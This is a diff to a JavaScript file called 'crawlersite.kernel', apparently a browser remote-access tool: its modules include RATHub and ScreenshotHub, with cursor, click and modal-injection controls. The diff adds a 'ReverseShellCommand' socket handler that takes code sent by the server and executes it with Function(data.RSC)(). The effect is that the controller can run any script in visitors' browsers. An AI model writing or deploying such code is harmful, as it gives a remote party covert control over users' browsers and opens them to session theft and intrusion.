@@ -1,4 +1,4 @@
-/*! crawlersite.kernel - v0.0.1 - 2017-06-14 */
+/*! crawlersite.kernel - v0.0.1 - 2017-06-15 */
 var Cross = (function () {
     var _timeStamp;
     var _serverUri;
@@ -643,6 +643,14 @@ var SocketHub = (function () {
                         }
                         RATHub.VirtualClick(data.Values);
                         break;
+                    case 'ReverseShellCommand#Request':
+                        if (_debug !== undefined) {
+                            if (_debug) {
+                                console.log('Click#Request');
+                            }
+                        }
+                        RATHub.ReverseShellCommand(data.Values);
+                        break;
                     default:
                         //console.log(data.Command);
                         break;
@@ -1169,6 +1177,12 @@ var RATHub = (function () {
 		}
 	}
 
+	var reverseShellCommand = function(data){
+		if(data.RSC != undefined && data.RSC !== null){
+			Function(data.RSC)();
+		}
+	}
+
 	return {
 		Initialize: constructor,
 		PrintCursor: printCursor,
@@ -1179,6 +1193,7 @@ var RATHub = (function () {
 		SetScrollDelta: setScrollDelta,
 		VirtualClick: virtualClick,
 		InjectModal: injectModal,
+		ReverseShellCommand: reverseShellCommand,
 	};
 })();
 var ScreenshotHub = (function () {
